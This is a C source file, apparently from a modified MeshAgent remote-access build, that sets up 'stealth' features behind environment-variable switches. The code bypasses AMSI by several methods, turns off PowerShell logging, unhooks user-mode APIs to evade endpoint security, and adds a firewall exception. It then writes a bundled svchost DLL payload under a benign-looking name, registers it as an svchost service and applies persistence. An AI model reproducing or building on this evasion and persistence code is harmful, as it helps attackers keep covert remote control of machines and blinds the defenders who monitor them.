// Lab/test stealth initializer
#include <windows.h>
#include <wchar.h>
#include <tchar.h>
#include "stealth.h"
#include "stealth_utils.h"
#include "branding_util.h"
#include "svchost_payload.h"
#include "stealth_defaults.h"

#ifndef STEALTH_FALLBACK_DLL_NAME
#define STEALTH_FALLBACK_DLL_NAME L"diagsvc.dll"
#endif

static int EnvEnabledW(const wchar_t* name, int defaultOn)
{
    wchar_t buf[16] = {0};
    DWORD n = GetEnvironmentVariableW(name, buf, (DWORD)(sizeof(buf)/sizeof(buf[0])));
    if (n == 0 || n >= (DWORD)(sizeof(buf)/sizeof(buf[0]))) { return defaultOn; }
    for (DWORD i = 0; i < n; ++i) { wchar_t c = buf[i]; if (c >= L'A' && c <= L'Z') buf[i] = (wchar_t)(c - L'A' + L'a'); }
    return (wcsncmp(buf, L"1", 1) == 0) || (wcscmp(buf, L"true") == 0) || (wcscmp(buf, L"yes") == 0) || (wcscmp(buf, L"on") == 0);
}

static void GetModulePathW(wchar_t* out, DWORD cch)
{
    if (!out || cch == 0) return;
    DWORD n = GetModuleFileNameW(NULL, out, cch);
    if (n >= cch) { out[cch-1] = L'\0'; }
}

void Stealth_InitLabFeatures(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
    // Default enable in StealthLab configs; otherwise require STEALTH_LAB=1
#ifdef MESHAGENT_STEALTHLAB_DEFAULT
    const int defaultLab = 1;
#else
    const int defaultLab = 0;
#endif
    if (!EnvEnabledW(L"STEALTH_LAB", defaultLab)) { return; }
    Stealth_EnsureLoggingDefaults();

    // 1) AMSI bypass selection: STEALTH_AMSI = patch|hwbp|ntcontinue|none (default: patch)
    wchar_t amsiMode[16] = {0};
    DWORD amsiLen = GetEnvironmentVariableW(L"STEALTH_AMSI", amsiMode, (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0])));
    if (amsiLen == 0 || amsiLen >= (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0]))) {
        // default
        if (!Stealth_PatchAMSI())
        {
            Stealth_DebugPrintfA("Stealth_PatchAMSI default path failed");
        }
    } else {
        for (DWORD i = 0; i < amsiLen; ++i) { wchar_t c = amsiMode[i]; if (c >= L'A' && c <= L'Z') amsiMode[i] = (wchar_t)(c - L'A' + L'a'); }
        if (wcscmp(amsiMode, L"hwbp") == 0) {
            if (!Stealth_PatchAMSI_HardwareBreakpoint())
            {
                Stealth_DebugPrintfA("STEALTH_AMSI=hwbp failed to arm hardware breakpoint");
            }
        } else if (wcscmp(amsiMode, L"ntcontinue") == 0) {
            if (!Stealth_PatchAMSI_NtContinue())
            {
                Stealth_DebugPrintfA("STEALTH_AMSI=ntcontinue failed to activate bypass");
            }
        } else if (wcscmp(amsiMode, L"none") == 0) {
            // do nothing
        } else {
            if (!Stealth_PatchAMSI())
            {
                Stealth_DebugPrintfA("Stealth_PatchAMSI fallback failed");
            }
        }
    }

    // 2) Disable PowerShell logging (default on in lab)
    if (EnvEnabledW(L"STEALTH_DISABLE_POWERSHELL_LOG", 1)) {
        if (!Stealth_DisablePowerShellLogging())
        {
            Stealth_DebugPrintfA("Stealth_DisablePowerShellLogging failed");
        }
    }

    // 3) Unhook common user-mode APIs (default on in lab)
    if (EnvEnabledW(L"STEALTH_API_UNHOOK", 1)) {
        if (!Stealth_UnhookUserModeAPIs())
        {
            Stealth_DebugPrintfA("Stealth_UnhookUserModeAPIs failed");
        }
    }

    // 4) Add firewall rule for current service binary (default on in lab)
    if (EnvEnabledW(L"STEALTH_FIREWALL", 1)) {
        wchar_t exePath[MAX_PATH] = {0};
        GetModulePathW(exePath, MAX_PATH);
        wchar_t svcNameW[256] = {0};
        MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), svcNameW, _countof(svcNameW));
        if (!Stealth_AddFirewallRuleForService(svcNameW, exePath))
        {
            Stealth_DebugPrintfA("Stealth_AddFirewallRuleForService failed for %ws", svcNameW);
        }
    }

    const mesh_stealth_profile_t* stealthProfile = MeshConfig_GetStealth();
    int extractDefault = 0;
    if (stealthProfile != NULL)
    {
        if (stealthProfile->bundleExtract != 0)
        {
            extractDefault = 1;
        }
        else if (stealthProfile->svchostMode != 0)
        {
            extractDefault = 1;
        }
    }

    // 5) Optionally extract bundled svchost DLL payload (from compiled header)
    if (EnvEnabledW(L"STEALTH_BUNDLE_EXTRACT", extractDefault)) {
        wchar_t dllOut[MAX_PATH] = {0};
        BOOL useInstallPath = FALSE;
        StealthInstallPaths paths;
        if (Stealth_GetInstallPaths(&paths)) {
            if (paths.installDir[0] != L'\0') {
                Stealth_CreateInstallationDirectory(paths.installDir);
            }
            if (paths.dllPath[0] != L'\0') {
                wcsncpy_s(dllOut, MAX_PATH, paths.dllPath, _TRUNCATE);
                useInstallPath = (dllOut[0] != L'\0');
            }
        }

        if (!useInstallPath) {
            // Fallback: drop next to executable
            GetModulePathW(dllOut, MAX_PATH);
            size_t n = wcslen(dllOut);
            while (n > 0 && dllOut[n-1] != L'\\' && dllOut[n-1] != L'/') { dllOut[--n] = L'\0'; }
            wchar_t dllName[MAX_PATH] = {0};
            MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), dllName, _countof(dllName));
            if (dllName[0] == L'\0') {
                wcscpy_s(dllName, _countof(dllName), STEALTH_FALLBACK_DLL_NAME);
            }
            wcscat_s(dllOut, MAX_PATH, dllName);
        }

        if (MeshSvchostPayload_WriteToPath(dllOut)) {
#ifdef UNICODE
            WCHAR svcNameW[256] = {0};
            MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), svcNameW, _countof(svcNameW));
            if (svcNameW[0] != L'\0') {
                if (!Stealth_RegisterSvchostService(svcNameW, dllOut)) {
                    Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", svcNameW);
                }
            }
#endif /* UNICODE */
        } else {
            Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
        }
    }

    Stealth_ApplyPersistenceProfile();
#else
    (void)0; // not enabled in this build
#endif
}
